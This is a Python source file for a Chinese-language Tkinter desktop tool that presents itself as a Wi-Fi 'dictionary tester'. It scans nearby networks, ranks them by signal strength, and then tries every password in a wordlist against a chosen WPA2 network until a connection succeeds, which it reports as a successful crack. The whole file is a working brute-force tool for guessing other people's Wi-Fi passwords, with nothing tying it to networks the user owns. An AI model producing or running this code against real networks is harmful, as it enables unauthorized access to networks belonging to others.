# /// script
# dependencies = [
#     "pywifi",
#     "comtypes",
# ]
# ///

import os
import threading
import time
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import pywifi
from pywifi import const


class WiFiTesterApp:

  def __init__(self, root):
    self.root = root
    self.root.title("Wi-Fi 字典测试工具 (信号排序增强版)")
    self.root.geometry("620x530")
    self.root.resizable(False, False)

    self.is_running = False
    self.wifi = pywifi.PyWiFi()

    # 检查无线网卡
    interfaces = self.wifi.interfaces()
    if not interfaces:
      messagebox.showerror(
          "错误", "未检测到可用的无线网卡，请确保电脑带有无线网卡！"
      )
      self.iface = None
    else:
      self.iface = interfaces[0]

    self.create_widgets()

  def create_widgets(self):
    # 1. SSID 区域
    frame_ssid = tk.LabelFrame(
        self.root, text=" 目标 Wi-Fi 设置 ", padx=10, pady=10
    )
    frame_ssid.pack(fill="x", padx=15, pady=10)

    tk.Label(frame_ssid, text="Wi-Fi 名称 (SSID):").grid(
        row=0, column=0, sticky="w", padx=5
    )

    self.combo_ssid = ttk.Combobox(frame_ssid, width=32)
    self.combo_ssid.grid(row=0, column=1, padx=5, pady=5)

    btn_scan = tk.Button(
        frame_ssid,
        text="扫描并排序",
        command=self.scan_wifi_networks,
        width=10,
        bg="#2196F3",
        fg="white",
    )
    btn_scan.grid(row=0, column=2, padx=5, pady=5)

    # 2. 字典文件选择区域
    frame_dict = tk.LabelFrame(
        self.root, text=" 密码字典设置 ", padx=10, pady=10
    )
    frame_dict.pack(fill="x", padx=15, pady=5)

    tk.Label(frame_dict, text="字典文件路径:").grid(
        row=0, column=0, sticky="w", padx=5
    )
    self.entry_dict = tk.Entry(frame_dict, width=33)
    self.entry_dict.grid(row=0, column=1, padx=5, pady=5)

    btn_browse = tk.Button(
        frame_dict, text="选择文件", command=self.browse_file, width=10
    )
    btn_browse.grid(row=0, column=2, padx=5, pady=5)

    # 3. 控制按钮区域
    frame_ctrl = tk.Frame(self.root)
    frame_ctrl.pack(fill="x", padx=15, pady=10)

    self.btn_start = tk.Button(
        frame_ctrl,
        text="开始测试",
        command=self.start_test_thread,
        bg="#4CAF50",
        fg="white",
        width=18,
        font=("Arial", 10, "bold"),
    )
    self.btn_start.pack(side="left", padx=10)

    self.btn_stop = tk.Button(
        frame_ctrl,
        text="停止测试",
        command=self.stop_test,
        bg="#f44336",
        fg="white",
        width=18,
        font=("Arial", 10, "bold"),
        state="disabled",
    )
    self.btn_stop.pack(side="left", padx=10)

    # 4. 日志输出/状态显示区域
    frame_log = tk.LabelFrame(self.root, text=" 运行日志与状态 ", padx=10, pady=10)
    frame_log.pack(fill="both", expand=True, padx=15, pady=5)

    self.log_text = scrolledtext.ScrolledText(
        frame_log, wrap="word", width=68, height=12
    )
    self.log_text.pack(fill="both", expand=True)

    if self.iface:
      self.log(
          f"[+] 初始化成功，当前网卡: {self.iface.name()}\n[+] 点击上方“扫描并排序”"
          "按钮可按信号强度从强到弱列出热点。"
      )
    else:
      self.log("[-] 警告：未检测到无线网卡！")

  def log(self, message):
    """在文本框中输出日志并滚动到底部"""
    self.log_text.insert(tk.END, message + "\n")
    self.log_text.see(tk.END)

  def browse_file(self):
    file_path = filedialog.askopenfilename(
        title="选择密码字典文件", filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
    )
    if file_path:
      self.entry_dict.delete(0, tk.END)
      self.entry_dict.insert(0, file_path)

  def scan_wifi_networks(self):
    if not self.iface:
      messagebox.showerror("错误", "没有可用的无线网卡！")
      return
    self.log("\n[*] 正在扫描周围的 Wi-Fi 信号，请稍候...")
    threading.Thread(target=self._run_scan, daemon=True).start()

  def _run_scan(self):
    try:
      self.iface.scan()
      time.sleep(3)
      results = self.iface.scan_results()

      wifi_dict = {}
      for profile in results:
        ssid = profile.ssid
        if ssid:
          signal = getattr(profile, "signal", -100)
          # 同名热点取信号最好的一个
          if ssid not in wifi_dict or signal > wifi_dict[ssid]:
            wifi_dict[ssid] = signal

      # 按照信号强度从强到弱排序 (负值越大代表信号越好，例如 -40 强于 -85)
      sorted_wifis = sorted(wifi_dict.items(), key=lambda x: x[1], reverse=True)

      # 格式化显示内容
      formatted_list = [
          f"{ssid} (信号: {signal} dBm)" for ssid, signal in sorted_wifis
      ]

      self.root.after(0, lambda: self._update_ssid_list(formatted_list))
    except Exception as e:
      self.root.after(0, lambda: self.log(f"[-] 扫描出错: {e}"))

  def _update_ssid_list(self, ssids):
    self.combo_ssid["values"] = ssids
    if ssids:
      self.combo_ssid.current(0)
      self.log(
          f"[+] 扫描完成！共发现 {len(ssids)} 个热点，已按信号强度从强到弱排序。"
      )
    else:
      self.log("[-] 未扫描到任何 Wi-Fi，请检查网卡状态或手动输入名称。")

  def start_test_thread(self):
    if not self.iface:
      messagebox.showerror("错误", "没有可用的无线网卡！")
      return

    selected_value = self.combo_ssid.get().strip()
    if not selected_value:
      messagebox.showwarning("提示", "请选择或输入要测试的 Wi-Fi 名称！")
      return

    # 自动从 "SSID (信号: -xx dBm)" 中提取出真实的 SSID
    if " (信号:" in selected_value:
      ssid = selected_value.split(" (信号:")[0]
    else:
      ssid = selected_value

    dict_path = self.entry_dict.get().strip()
    if not dict_path or not os.path.exists(dict_path):
      messagebox.showwarning("提示", "请选择有效的密码字典文件路径！")
      return

    self.is_running = True
    self.btn_start.config(state="disabled")
    self.btn_stop.config(state="normal")

    threading.Thread(
        target=self.run_test, args=(ssid, dict_path), daemon=True
    ).start()

  def stop_test(self):
    self.is_running = False
    self.log("\n[-] 用户手动停止了测试。")
    self.btn_start.config(state="normal")
    self.btn_stop.config(state="disabled")

  def run_test(self, ssid, dict_path):
    passwords = []
    try:
      with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
    except UnicodeDecodeError:
      with open(dict_path, "r", encoding="gbk", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    total = len(passwords)
    success_found = False
    self.log(
        f"\n[+] 成功加载字典，共计 {total} 个密码。开始测试目标: [{ssid}]..."
    )

    for i, pwd in enumerate(passwords, 1):
      if not self.is_running:
        break

      self.log(f"[*] [{i}/{total}] 正在测试密码: {pwd}")

      try:
        if self.test_wifi_password(ssid, pwd):
          success_msg = (
              f"\n🎉 成功找到密码！\n目标 Wi-Fi: {ssid}\n正确密码: {pwd}"
          )
          self.log(success_msg)
          self.root.after(
              0, lambda: messagebox.showinfo("🎉 破解成功", success_msg)
          )
          success_found = True
          break
      except Exception:
        time.sleep(1)
        continue

    if not success_found and self.is_running:
      self.log(
          "\n❌ 测试结束：字典已全部跑完，未能在其中找到匹配的正确密码。"
      )
      self.root.after(
          0,
          lambda: messagebox.showwarning(
              "测试结束",
              "字典已全部跑完，未能在其中找到匹配的正确密码。",
          ),
      )

    self.is_running = False
    self.root.after(0, lambda: self.btn_start.config(state="normal"))
    self.root.after(0, lambda: self.btn_stop.config(state="disabled"))

  def test_wifi_password(self, ssid, password):
    self.iface.disconnect()
    time.sleep(0.3)

    if self.iface.status() == const.IFACE_CONNECTED:
      return False

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    self.iface.remove_all_network_profiles()
    tmp_profile = self.iface.add_network_profile(profile)

    self.iface.connect(tmp_profile)

    start_time = time.time()
    while time.time() - start_time < 4:
      if not self.is_running:
        return False
      if self.iface.status() == const.IFACE_CONNECTED:
        return True
      time.sleep(0.3)

    return False


if __name__ == "__main__":
  root = tk.Tk()
  app = WiFiTesterApp(root)
  root.mainloop()